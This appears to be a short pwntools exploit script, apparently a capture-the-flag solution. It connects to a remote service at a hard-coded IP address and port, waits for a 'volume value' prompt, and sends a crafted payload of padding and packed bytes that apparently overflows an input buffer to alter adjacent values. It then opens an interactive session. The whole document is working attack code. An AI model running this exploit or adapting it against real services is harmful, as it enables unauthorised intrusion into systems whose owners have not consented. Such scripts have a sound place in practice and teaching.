from pwn import *

p = remote('62.173.140.174', '17400')
p.recvuntil(b'Enter the desired volume value (0-100): ', timeout=1)

payload = 8 * b'A' + p32(40) + 2 * b'A' + p8(0) + p8(1)
p.sendline(payload)

p.interactive()
